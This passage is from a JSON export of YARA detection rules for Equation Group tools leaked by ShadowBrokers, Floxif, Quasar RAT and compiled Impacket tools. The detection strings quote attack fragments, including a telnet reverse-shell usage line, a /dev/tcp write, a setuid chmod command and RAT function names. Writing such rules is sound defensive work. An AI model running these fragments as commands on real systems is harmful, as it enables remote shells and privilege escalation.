\"[-] kernel not vulnerable\" fullword ascii\n      $s2 = \"[-] failed to spawn shell\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}","date":"2017-04-08 13:26:31","description":"Equation Group hack tool leaked by ShadowBrokers- file envoytomato","minimum_yara":"1.7","name":"EquationGroup_envoytomato_RID3188","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"9ce659d819e264cf98bec9d5d13358a7","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_smash_RID2EDF : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file smash\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:33:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"T=<target IP> [O=<port>] Y=<target type>\" fullword ascii\n      $x2 = \"no command given!! bailing...\" fullword ascii\n      $x3 = \"no port. assuming 22...\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}","date":"2017-04-08 11:33:01","description":"Equation Group hack tool leaked by ShadowBrokers- file smash","minimum_yara":"1.7","name":"EquationGroup_smash_RID2EDF","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"0f92f7586addcead7afdf9a3311aba59","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_ratload_RID2FAA : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ratload\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:06:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/tmp/ratload.tmp.sh\" fullword ascii\n      $x2 = \"Remote Usage: /bin/telnet locip locport < /dev/console | /bin/sh\\\"\" fullword ascii\n      $s6 = \"uncompress -f ${NAME}.Z && PATH=. ${ARGS1} ${NAME} ${ARGS2} && rm -f ${NAME}\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}","date":"2017-04-08 12:06:51","description":"Equation Group hack tool leaked by ShadowBrokers- file ratload","minimum_yara":"1.7","name":"EquationGroup_ratload_RID2FAA","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"0b25d89f893c48b8144b4ed7b9d55018","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_ys_RID2DAF : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ys.auto\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 10:42:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"EXPLOIT_SCRIPME=\\\"$EXPLOIT_SCRIPME\\\"\" fullword ascii\n      $x3 = \"DEFTARGET=`head /current/etc/opscript.txt 2>/dev/null | grepip 2>/dev/null | head -1`\" fullword ascii\n      $x4 = \"FATAL ERROR: -x port and -n port MUST NOT BE THE SAME.\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}","date":"2017-04-08 10:42:21","description":"Equation Group hack tool leaked by ShadowBrokers- file ys.auto","minimum_yara":"1.7","name":"EquationGroup_ys_RID2DAF","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"00539eff444ec58e3afbdcb6c50af743","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_ewok_RID2E79 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ewok\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:16:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Example: ewok -t target public\" fullword ascii\n      $x2 = \"Usage:  cleaner host community fake_prog\" fullword ascii\n      $x3 = \"-g  - Subset of -m that Green Spirit hits \" fullword ascii\n      $x4 = \"--- ewok version\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and 1 of them )\n}","date":"2017-04-08 11:16:01","description":"Equation Group hack tool leaked by ShadowBrokers- file ewok","minimum_yara":"1.7","name":"EquationGroup_ewok_RID2E79","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"699aaae8212224474d565d94c85668e8","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_xspy_RID2E97 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file xspy\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:21:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"USAGE: xspy -display <display> -delay <usecs> -up\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and all of them )\n}","date":"2017-04-08 11:21:01","description":"Equation Group hack tool leaked by ShadowBrokers- file xspy","minimum_yara":"1.7","name":"EquationGroup_xspy_RID2E97","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"02cf1914e6e12c5d035d5bd424acf80f","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_estesfox_RID3034 : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file estesfox\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"chown root:root x;chmod 4777 x`' /tmp/logwatch.$2/cron\" fullword ascii\n   condition: \n      all of them\n}","date":"2017-04-08 12:29:51","description":"Equation Group hack tool leaked by ShadowBrokers- file estesfox","minimum_yara":"1.7","name":"EquationGroup_estesfox_RID3034","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"49d1c5133034ee666c67d0a86ffeef84","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_elatedmonkey_1_0_1_1_RID3404 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file elatedmonkey.1.0.1.1.sh\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 15:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x3 = \"Usage: $0 ( -s IP PORT | CMD )\" fullword ascii\n      $s5 = \"os.execl(\\\"/bin/sh\\\", \\\"/bin/sh\\\", \\\"-c\\\", \\\"$CMD\\\")\" fullword ascii\n      $s13 = \"PHP_SCRIPT=\\\"$HOME/public_html/info$X.php\\\"\" fullword ascii\n      $s15 = \"cat > /dev/tcp/127.0.0.1/80 <<END\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 5KB and ( 1 of ( $x* ) and 5 of ( $s* ) ) ) or ( all of them )\n}","date":"2017-04-08 15:12:31","description":"Equation Group hack tool leaked by ShadowBrokers- file elatedmonkey.1.0.1.1.sh","minimum_yara":"1.7","name":"EquationGroup_elatedmonkey_1_0_1_1_RID3404","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"2d0226c0d1bbeca40f7541acc78de960","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_scanner_RID2FAD : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file scanner\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:07:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"program version netid     address             service         owner\" fullword ascii\n      $x4 = \"*** Sorry about the raw output, I'll leave it for now\" fullword ascii\n      $x5 = \"-scan winn %s one\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}","date":"2017-04-08 12:07:21","description":"Equation Group hack tool leaked by ShadowBrokers- file scanner","minimum_yara":"1.7","name":"EquationGroup_scanner_RID2FAD","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"b477266f13c036c85702cd3cfb17db5f","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup__ftshell_ftshell_v3_10_3_0_RID364E : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 16:50:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"set uRemoteUploadCommand \\\"[exec cat /current/.ourtn-ftshell-upcommand]\\\"\" fullword ascii\n      $s2 = \"send \\\"\\\\[ \\\\\\\"\\\\$BASH\\\\\\\" = \\\\\\\"/bin/bash\\\\\\\" -o \\\\\\\"\\\\$SHELL\\\\\\\" = \\\\\\\"/bin/bash\\\\\\\" \\\\] &&\" ascii\n      $s3 = \"system rm -f /current/tmp/ftshell.latest\" fullword ascii\n      $s4 = \"# ftshell -- File Transfer Shell\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 100KB and 1 of them ) or ( 2 of them )\n}","date":"2017-04-08 16:50:11","description":"Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7","minimum_yara":"1.7","name":"EquationGroup__ftshell_ftshell_v3_10_3_0_RID364E","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"e27684c1b964de88273525328e05eede","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup__scanner_scanner_v2_1_2_RID357D : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files scanner, scanner.v2.1.2\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 16:15:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Welcome to the network scanning tool\" fullword ascii\n      $s2 = \"Scanning port %d\" fullword ascii\n      $s3 = \"/current/down/cmdout/scans\" fullword ascii\n      $s4 = \"Scan for SSH version\" fullword ascii\n      $s5 = \"program vers proto   port  service\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 100KB and 2 of them ) or ( all of them )\n}","date":"2017-04-08 16:15:21","description":"Equation Group hack tool leaked by ShadowBrokers- from files scanner, scanner.v2.1.2","minimum_yara":"1.7","name":"EquationGroup__scanner_scanner_v2_1_2_RID357D","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"7b6e303c108264a88cfd1a660fa01de9","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup__ghost_sparc_ghost_x86_3_RID361A : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files ghost_sparc, ghost_x86\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 16:41:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Usage: %s [-v os] [-p] [-r] [-c command] [-a attacker] target\" fullword ascii\n      $x2 = \"Sending shellcode as part of an open command...\" fullword ascii\n      $x3 = \"cmdshellcode\" fullword ascii\n      $x4 = \"You will not be able to run the shellcode. Exiting...\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 70KB and 1 of them ) or ( 2 of them )\n}","date":"2017-04-08 16:41:31","description":"Equation Group hack tool leaked by ShadowBrokers- from files ghost_sparc, ghost_x86","minimum_yara":"1.7","name":"EquationGroup__ghost_sparc_ghost_x86_3_RID361A","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"185ff0e54027b5a22293763ccc427a9c","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup__pclean_v2_1_1_pclean_v2_1_1_4_RID3748 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files pclean.v2.1.1.0-linux-i386, pclean.v2.1.1.0-linux-x86_64\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 17:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-c cmd_name:     strncmp() search for 1st %d chars of commands that \" fullword ascii\n      $s2 = \"e.g.: -n 1-1024,1080,6666,31337 \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and all of them )\n}","date":"2017-04-08 17:31:51","description":"Equation Group hack tool leaked by ShadowBrokers- from files pclean.v2.1.1.0-linux-i386, pclean.v2.1.1.0-linux-x86_64","minimum_yara":"1.7","name":"EquationGroup__pclean_v2_1_1_pclean_v2_1_1_4_RID3748","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"aed6ef9aa0b36f9c67ca60fb0013c438","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup__jparsescan_parsescan_5_RID35FF : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files jparsescan, parsescan\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 16:37:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"# default is to dump out all scanned hosts found\" fullword ascii\n      $s2 = \"$bool .= \\\" -r \\\" if (/mibiisa.* -r/);\" fullword ascii\n      $s3 = \"sadmind is available on two ports, this also works)\" fullword ascii\n      $s4 = \"-x IP      gives \\\\\\\"hostname:# users:load ...\\\\\\\" if positive xwin scan\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 40KB and 1 of them ) or ( 2 of them )\n}","date":"2017-04-08 16:37:01","description":"Equation Group hack tool leaked by ShadowBrokers- from files jparsescan, parsescan","minimum_yara":"1.7","name":"EquationGroup__jparsescan_parsescan_5_RID35FF","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"50a686d09c2e759360c6cd02321d7e9f","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup__funnelout_v4_1_0_1_RID33BA : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files funnelout.v4.1.0.1.pl\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 15:00:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"header(\\\"Set-Cookie: bbsessionhash=\\\" . \\\\$hash . \\\"; path=/; HttpOnly\\\");\" fullword ascii\n      $s2 = \"if ($code =~ /proxyhost/) {\" fullword ascii\n      $s3 = \"\\\\$rk[1] = \\\\$rk[1] - 1;\" fullword ascii\n      $s4 = \"#existsUser($u) or die \\\"User '$u' does not exist in database.\\\\n\\\";\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )\n}","date":"2017-04-08 15:00:11","description":"Equation Group hack tool leaked by ShadowBrokers- from files funnelout.v4.1.0.1.pl","minimum_yara":"1.7","name":"EquationGroup__funnelout_v4_1_0_1_RID33BA","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"d8f05177e79ccbb0b24b76da425429bf","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup__magicjack_v1_1_0_0_client_RID364E : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files magicjack_v1.1.0.0_client-1.1.0.0.py\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 16:50:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"temp = ((left >> 1) ^ right) & 0x55555555\" fullword ascii\n      $s2 = \"right ^= (temp <<  16) & 0xffffffff\" fullword ascii\n      $s3 = \"tempresult = \\\"\\\"\" fullword ascii\n      $s4 = \"num = self.bytes2long(data)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 80KB and 3 of them ) or ( all of them )\n}","date":"2017-04-08 16:50:11","description":"Equation Group hack tool leaked by ShadowBrokers- from files magicjack_v1.1.0.0_client-1.1.0.0.py","minimum_yara":"1.7","name":"EquationGroup__magicjack_v1_1_0_0_client_RID364E","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"73341b040a293c76e7ad301d3b34371c","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup__ftshell_RID3014 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:24:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if { [string length $uRemoteUploadCommand]\" fullword ascii\n      $s2 = \"processUpload\" fullword ascii\n      $s3 = \"global dothisreallyquiet\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )\n}","date":"2017-04-08 12:24:31","description":"Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7","minimum_yara":"1.7","name":"EquationGroup__ftshell_RID3014","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"f88e054eb2f98b07227534fda5d33a3b","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Malware_Floxif_mpsvc_dll_RID30C4 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Malware - Floxif\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-04-07 12:53:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 04 80 7a 03 01 75 04 8d 42 04 c3 8d 42 04 53 8b } \n      $op2 = { 88 19 74 03 41 eb ea c6 42 03 01 5b c3 8b 4c 24 } \n      $op3 = { ff 03 8d 00 f9 ff ff 88 01 eb a1 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}","date":"2017-04-07 12:53:51","description":"Malware - Floxif","minimum_yara":"1.7","name":"Malware_Floxif_mpsvc_dll_RID30C4","reference":"Internal Research","required_modules":[],"rule_hash":"1b12342c5f193d0105cd3b3c6b11111d","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Quasar_RAT_1_RID2B54 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Quasar RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\"\n      date = \"2017-04-07 09:01:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"DoUploadAndExecute\" fullword ascii\n      $s2 = \"DoDownloadAndExecute\" fullword ascii\n      $s3 = \"DoShellExecute\" fullword ascii\n      $s4 = \"set_Processname\" fullword ascii\n      $op1 = { 04 1e fe 02 04 16 fe 01 60 } \n      $op2 = { 00 17 03 1f 20 17 19 15 28 } \n      $op3 = { 00 04 03 69 91 1b 40 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of ( $s* ) or all of ( $op* ) )\n}","date":"2017-04-07 09:01:51","description":"Detects Quasar RAT","minimum_yara":"1.7","name":"Quasar_RAT_1_RID2B54","reference":"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf","required_modules":[],"rule_hash":"af44fc8c42377d91843afe7d2f35c93a","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Quasar_RAT_2_RID2B55 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Quasar RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\"\n      date = \"2017-04-07 09:02:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"GetKeyloggerLogsResponse\" fullword ascii\n      $x2 = \"get_Keylogger\" fullword ascii\n      $x3 = \"HandleGetKeyloggerLogsResponse\" fullword ascii\n      $s1 = \"DoShellExecuteResponse\" fullword ascii\n      $s2 = \"GetPasswordsResponse\" fullword ascii\n      $s3 = \"GetStartupItemsResponse\" fullword ascii\n      $s4 = \"<GetGenReader>b__7\" fullword ascii\n      $s5 = \"RunHidden\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and $x1 ) or ( all of them )\n}","date":"2017-04-07 09:02:01","description":"Detects Quasar RAT","minimum_yara":"1.7","name":"Quasar_RAT_2_RID2B55","reference":"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf","required_modules":[],"rule_hash":"d8bba788903f2f780dd1c4d39b0264ad","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_sniffer_RID2FFB : DEMO EXE FILE HKTL T1040 {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:20:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ssniffer\" fullword ascii\n      $s2 = \"impacket.dhcp(\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )\n}","date":"2017-04-07 12:20:21","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_sniffer_RID2FFB","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"d057a3d9f361df652943973e264c2526","score":75,"tags":["DEMO","EXE","T1040","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_mmcexec_RID2FF0 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:18:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"smmcexec\" fullword ascii\n      $s2 = \"\\\\yzHPlU=QA\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 16000KB and all of them )\n}","date":"2017-04-07 12:18:31","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_mmcexec_RID2FF0","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"857f31811354d2f9596adb3a9340cb1e","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Impacket_Tools_ifmap_RID2F1B : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 11:43:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"bifmap.exe.manifest\" fullword ascii\n      $s2 = \"impacket.dcerpc.v5.epm(\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )\n}","date":"2017-04-07 11:43:01","description":"Compiled Impacket Tools","minimum_yara":"1.7","name":"Impacket_Tools_ifmap_RID2F1B","reference":"https://github.com/maaaaz/impacket-examples-windows","required_modules":[],"rule_hash":"3d5ab83b07fe194d79cb91f48d219932","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule karmaSMB_RID29FF : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 02:50:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"bkarmaSMB_RID29FF.exe.manifest\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}","date":"2017-04-07 02:50:01","description":"Compiled Impacket 